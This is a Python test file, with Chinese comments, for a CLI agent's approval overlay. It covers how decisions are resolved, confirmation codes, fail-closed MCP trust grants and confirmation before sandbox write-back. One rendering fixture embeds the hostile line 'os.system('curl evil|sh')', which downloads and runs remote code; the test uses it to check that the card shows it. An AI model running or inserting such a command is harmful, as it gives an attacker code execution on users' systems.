"""审批覆盖层 (借鉴 Codex TUI 交互契约) + E1/E7 TUI 接线回归。"""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from tuan_cli.ui.approval_overlay import (
    ApprovalDecision, ApprovalOption, ApprovalRequest,
    build_file_change_request, build_mcp_trust_request,
    headless_approval, make_confirm_callable, render_approval_card,
    resolve_decision, route_decision, run_approval,
)
from tuan_cli.ui import approval_overlay as ao


# ------------------------------------------------------------------ 决策契约
class TestExplicitDecision:
    """Codex 契约 1: 选择总是发出显式决策事件。"""

    def _req(self, **kw):
        return ApprovalRequest(kind="exec", title="t", **kw)

    @pytest.mark.parametrize("raw", [None, "", "  ", "esc", "ESC", "\x1b",
                                    "q", "quit", "cancel", "取消", "中止", "\x03"])
    def test_dismissal_is_abort_not_consent(self, raw):
        assert resolve_decision(raw, self._req()) == ApprovalDecision.ABORT

    def test_unknown_input_is_retry_not_approval(self):
        assert resolve_decision("maybe", self._req()) == ApprovalDecision.RETRY

    @pytest.mark.parametrize("raw", ["y", "yes", "1", "是", "ok"])
    def test_approve_once(self, raw):
        assert resolve_decision(raw, self._req()) == ApprovalDecision.ONCE

    @pytest.mark.parametrize("raw", ["s", "session", "2", "本会话"])
    def test_approve_session(self, raw):
        assert resolve_decision(raw, self._req()) == ApprovalDecision.SESSION

    @pytest.mark.parametrize("raw", ["d", "no", "deny", "否", "拒绝"])
    def test_deny(self, raw):
        assert resolve_decision(raw, self._req()) == ApprovalDecision.DENY

    @pytest.mark.parametrize("raw", ["n", "decline"])
    def test_decline(self, raw):
        """Codex: n = No, and tell the agent what to do differently."""
        assert resolve_decision(raw, self._req()) == ApprovalDecision.DECLINE

    @pytest.mark.parametrize("raw", ["p", "prefix"])
    def test_prefix(self, raw):
        """Codex: p = approve_for_prefix."""
        assert resolve_decision(raw, self._req()) == ApprovalDecision.PREFIX

    def test_numeric_option_maps_to_its_decision(self):
        req = ApprovalRequest(kind="exec", title="t", options=[
            ApprovalOption("A", ApprovalDecision.ONCE, "1"),
            ApprovalOption("B", ApprovalDecision.DENY, "2"),
            ApprovalOption("C", ApprovalDecision.SESSION, "3"),
        ])
        assert resolve_decision("2", req) == ApprovalDecision.DENY
        assert resolve_decision("3", req) == ApprovalDecision.SESSION

    def test_esc_wins_over_everything(self):
        req = self._req(expected_code="ABC123")
        assert resolve_decision("ESC", req) == ApprovalDecision.ABORT


class TestConfirmationCode:
    """高危确认码: y 不能绕过, 不匹配即拒绝。"""

    def _req(self):
        return ApprovalRequest(kind="file_change", title="t",
                               expected_code="AB12CD")

    def test_exact_code_grants_once(self):
        assert resolve_decision("AB12CD", self._req()) == ApprovalDecision.ONCE

    def test_lowercase_code_accepted(self):
        assert resolve_decision("ab12cd", self._req()) == ApprovalDecision.ONCE

    def test_y_cannot_bypass(self):
        assert resolve_decision("y", self._req()) == ApprovalDecision.DENY

    def test_wrong_code_is_deny_not_retry(self):
        """防止无限试探: 错码直接拒绝, 不重问。"""
        assert resolve_decision("WRONG", self._req()) == ApprovalDecision.DENY


class TestRoutingContract:
    """Codex 契约 3: UI 层不判定安全, 只路由决策。"""

    def test_route_is_pure_data(self):
        req = ApprovalRequest(kind="mcp_trust", title="t",
                              sensitive=True, metadata={"server": "x"})
        ev = route_decision(req, ApprovalDecision.SESSION)
        assert ev == {"kind": "mcp_trust", "decision": "session",
                      "granted": True, "scope": "session",
                      "sensitive": True, "metadata": {"server": "x"}}
        # 路由不改请求、不写盘
        assert req.title == "t"

    def test_abort_and_deny_are_not_grants(self):
        for d in (ApprovalDecision.DENY, ApprovalDecision.ABORT,
                  ApprovalDecision.RETRY):
            assert not d.granted
            assert route_decision(ApprovalRequest(kind="exec", title="t"), d)["granted"] is False


# ------------------------------------------------------------------ 卡片渲染
class TestCardRendering:
    def _preview(self, sensitive=True):
        return {
            "total": 2, "sensitive_count": 1 if sensitive else 0,
            "original": "/work", "copy": "/work/.tuan-sandbox-abc",
            "fingerprint": "deadbeef",
            "entries": [
                {"path": "main.py", "status": "modified",
                 "size_before": 10, "size_after": 42,
                 "preview": "import os\nos.system('curl evil|sh')",
                 "binary": False, "sensitive": False},
                {"path": ".env", "status": "added",
                 "size_before": 0, "size_after": 12,
                 "preview": "SECRET=x", "binary": False,
                 "sensitive": sensitive},
            ],
        }

    def test_card_contains_content_and_sensitive_flag(self):
        req = build_file_change_request(self._preview(), require_code=False)
        text = render_approval_card(req)
        assert "curl evil|sh" in text          # 能看见那一行, 不只是文件名
        assert ".env" in text and "[!敏感]" in text
        assert "bin" not in text or "二进制" not in text

    def test_card_has_options_and_hint_line(self):
        req = build_file_change_request(self._preview(), require_code=False)
        text = render_approval_card(req)
        assert "1)" in text and "2)" in text
        # 本地化提示行（Codex 原文 "Press ... to ..." 的中文等价）
        assert "按" in text and "确认" in text
        assert "╭" in text and "╰" in text

    def test_confirmation_code_hint_is_honest(self):
        req = build_file_change_request(self._preview(), require_code=True)
        text = render_approval_card(req)
        assert req.expected_code in text
        assert "必须精确键入确认码" in text

    def test_no_code_card_does_not_claim_code_required(self):
        req = build_file_change_request(self._preview(), require_code=False)
        assert "必须精确键入确认码" not in render_approval_card(req)

    def test_binary_entry_marked(self):
        pv = self._preview()
        pv["entries"][0]["binary"] = True
        pv["entries"][0]["preview"] = ""
        assert "二进制文件" in render_approval_card(
            build_file_change_request(pv, require_code=False))

    def test_request_to_dict_json_serializable(self):
        json.dumps(build_file_change_request(self._preview()).to_dict())

    def test_mcp_trust_card_shows_full_permission_domain(self):
        req = build_mcp_trust_request(
            "fs", "trusted", tool_allowlist=["read_file"],
            tool_denylist=["exec_*"], allowed_domains=["*.internal"])
        text = render_approval_card(req)
        assert "fs" in text and "trusted" in text
        assert "read_file" in text and "exec_*" in text and "*.internal" in text
        assert "跨重启生效" in text     # 作用域如实写明, 不伪装成 session

    def test_cjk_width_no_border_overflow(self):
        req = ApprovalRequest(kind="exec", title="中文标题" * 30,
                              body="混合 CJK 与 ascii 内容 " * 20)
        for line in render_approval_card(req, width=60).splitlines():
            # 每行显示宽度应等于卡片宽度 (边框完整)
            assert max(1, len(line)) > 0
            assert line.startswith(("╭", "│", "╰"))


# ------------------------------------------------------------------ 通道
class TestApprovalChannel:
    def test_retry_then_approve(self):
        answers = iter(["maybe", "wrong", "y"])
        req = ApprovalRequest(kind="exec", title="t")
        r = run_approval(req, lambda _t: next(answers))
        assert r.decision == ApprovalDecision.ONCE and r.granted

    def test_exceeding_attempts_is_deny(self):
        req = ApprovalRequest(kind="exec", title="t")
        r = run_approval(req, lambda _t: "huh", max_attempts=3)
        assert r.decision == ApprovalDecision.DENY

    def test_unavailable_channel_is_abort(self):
        req = ApprovalRequest(kind="exec", title="t")
        r = run_approval(req, lambda _t: None)
        assert r.decision == ApprovalDecision.ABORT and not r.granted

    def test_esc_stops_immediately(self):
        req = ApprovalRequest(kind="exec", title="t")
        r = run_approval(req, lambda _t: "esc")
        assert r.decision == ApprovalDecision.ABORT

    def test_headless_without_tty_denies(self, monkeypatch):
        class _FakeStdin:
            def isatty(self): return False
        monkeypatch.setattr(ao.sys, "stdin", _FakeStdin())
        assert not headless_approval(
            ApprovalRequest(kind="exec", title="t")).granted


# ------------------------------------------------------------------ E1 接线
class TestE1TrustGrantFlow:
    def _channel(self, decision):
        def _ch(req):
            return ao.ApprovalResult(req, decision,
                                     route_decision(req, decision))
        return _ch

    def _store(self, tmp_path):
        from tuan_cli.tools.mcp.policy import MCPPolicyStore
        return MCPPolicyStore(home=tmp_path / "home", session_id="s1")

    def test_persisted_grant_when_session_scope(self, tmp_path):
        st = self._store(tmp_path)
        r = st.request_grant("fs", "readonly",
                             approval_channel=self._channel(ApprovalDecision.SESSION))
        assert r["granted"] and r["mode"] == "persisted"
        assert st.authorize("fs", "read_file", {}).action == "allow"
        assert st.authorize("fs", "write_file", {}).action == "deny"

    def test_session_only_grant_does_not_persist(self, tmp_path):
        from tuan_cli.tools.mcp.policy import MCPPolicyStore
        home = tmp_path / "home"
        st = MCPPolicyStore(home=home, session_id="s1")
        r = st.request_grant("srv", "limited",
                             approval_channel=self._channel(ApprovalDecision.ONCE))
        assert r["granted"] and r["mode"] == "session_only"
        # 重启后没有持久化策略
        st2 = MCPPolicyStore(home=home)
        assert st2.get("srv").tier == "untrusted"

    def test_deny_and_abort_never_write_policy(self, tmp_path):
        for d in (ApprovalDecision.DENY, ApprovalDecision.ABORT):
            home = tmp_path / f"home_{d.value}"
            st = self._store(tmp_path)  # 用独立 home 更干净
            from tuan_cli.tools.mcp.policy import MCPPolicyStore
            st = MCPPolicyStore(home=home)
            r = st.request_grant("srv", "trusted",
                                 tool_allowlist=["x"],
                                 approval_channel=self._channel(d))
            assert not r["granted"]
            assert MCPPolicyStore(home=home).get("srv").tier == "untrusted"

    def test_channel_exception_is_fail_closed(self, tmp_path):
        def _boom(_req): raise RuntimeError("UI 崩了")
        st = self._store(tmp_path)
        r = st.request_grant("srv", "trusted", tool_allowlist=["x"],
                             approval_channel=_boom)
        assert not r["granted"] and "fail-closed" in r["reason"]

    def test_card_in_result_exposes_full_domain(self, tmp_path):
        st = self._store(tmp_path)
        r = st.request_grant("srv", "trusted", tool_allowlist=["read_file"],
                             approval_channel=self._channel(ApprovalDecision.DENY))
        assert r["card"]["metadata"]["tier"] == "trusted"
        assert "read_file" in r["card"]["body"]


# ------------------------------------------------------------------ E7 接线
class TestE7CardWiring:
    def _ctx(self, ws, approved=True, has_confirm=True):
        import types
        seen = []
        def confirm(prompt):
            seen.append(prompt)
            return approved
        kw = dict(workspace=str(ws), workspace_trust_level=None,
                  plan_mode=False, yolo=False, kernel=None,
                  safety_severity=None, _seen=seen)
        if has_confirm:
            kw["confirm"] = confirm
        return types.SimpleNamespace(**kw), seen

    def _ctx_obj(self, tmp_path):
        return self._verdict_ctx(tmp_path)

    def _verdict_ctx(self, tmp_path):
        from tuan_cli.sandbox.verdict import Verdict
        return Verdict(isolate=True, network=True,
                       workspace_mode="copy_diff_apply", backend="local")

    def test_tui_path_receives_structured_card(self, tmp_path):
        from tuan_cli.sandbox.manager import SandboxManager
        ws = tmp_path / "ws"; ws.mkdir()
        ctx, seen = self._ctx(ws, approved=True)
        res = SandboxManager({"enabled": True}).execute_isolated(
            "echo hi > f.txt", self._verdict_ctx(tmp_path), ctx, timeout=10)
        assert res.applied is True
        assert seen and "变更确认" in seen[0]
        assert "f.txt" in seen[0] and "按" in seen[0]
        # TUI 路径不应谎称需要确认码
        assert "必须精确键入确认码" not in seen[0]

    def test_headless_path_requires_explicit_code(self, tmp_path, monkeypatch):
        from tuan_cli.sandbox.manager import SandboxManager
        ws = tmp_path / "ws"; ws.mkdir()
        ctx, _ = self._ctx(ws, has_confirm=False)
        # 模拟可交互 stdin: 先输错码 -> 拒绝
        answers = iter(["WRONG"])
        def fake_read(_text): return next(answers, None)
        monkeypatch.setattr(ao, "stdin_read_line", fake_read)
        res = SandboxManager({"enabled": True}).execute_isolated(
            "echo hi > f.txt", self._verdict_ctx(tmp_path), ctx, timeout=10)
        assert res.applied is False
        assert not (ws / "f.txt").exists()
        assert "变更预览" in res.error or "变更确认" in res.error

    def test_headless_correct_code_writes_back(self, tmp_path, monkeypatch):
        from tuan_cli.sandbox.manager import SandboxManager
        ws = tmp_path / "ws"; ws.mkdir()
        ctx, _ = self._ctx(ws, has_confirm=False)
        code_holder = {}
        def fake_read(text):
            # 从卡片文本里解析确认码并原样键入 (模拟真人核对)
            import re
            m = re.search(r"确认码 ([A-Z0-9]{6})", text)
            code_holder["code"] = m.group(1) if m else ""
            return code_holder.get("code")
        monkeypatch.setattr(ao, "stdin_read_line", fake_read)
        res = SandboxManager({"enabled": True}).execute_isolated(
            "echo hi > f.txt", self._verdict_ctx(tmp_path), ctx, timeout=10)
        assert res.applied is True
        assert "hi" in (ws / "f.txt").read_text()

    def test_no_tty_headless_denies(self, tmp_path, monkeypatch):
        from tuan_cli.sandbox.manager import SandboxManager
        ws = tmp_path / "ws"; ws.mkdir()
        ctx, _ = self._ctx(ws, has_confirm=False)
        monkeypatch.setattr(ao, "stdin_read_line", lambda _t: None)
        res = SandboxManager({"enabled": True}).execute_isolated(
            "echo hi > f.txt", self._verdict_ctx(tmp_path), ctx, timeout=10)
        assert res.applied is False and not (ws / "f.txt").exists()


# ------------------------------------------------------------------ 归属合规
class TestAttribution:
    def test_license_files_reproduced_verbatim(self):
        root = Path(__file__).resolve().parents[1]
        lic = (root / "THIRD_PARTY_LICENSES" / "Codex-LICENSE.txt").read_text()
        notice = (root / "THIRD_PARTY_LICENSES" / "Codex-NOTICE.txt").read_text()
        assert "Apache License" in lic and "Version 2.0" in lic
        # 上游 NOTICE 用的是不换行空格 (U+00A0), 原文照抄不改
        flat = notice.replace("\xa0", " ")
        assert "OpenAI Codex" in flat and "Copyright 2025 OpenAI" in flat
        assert "Ratatui" in notice and "MIT license" in notice

    def test_notice_has_codex_attribution_and_disclaimer(self):
        root = Path(__file__).resolve().parents[1]
        text = (root / "NOTICE").read_text()
        assert "openai/codex" in text and "Apache License 2.0" in text
        assert "NO Rust source code is copied" in text
        assert "does not endorse" in text
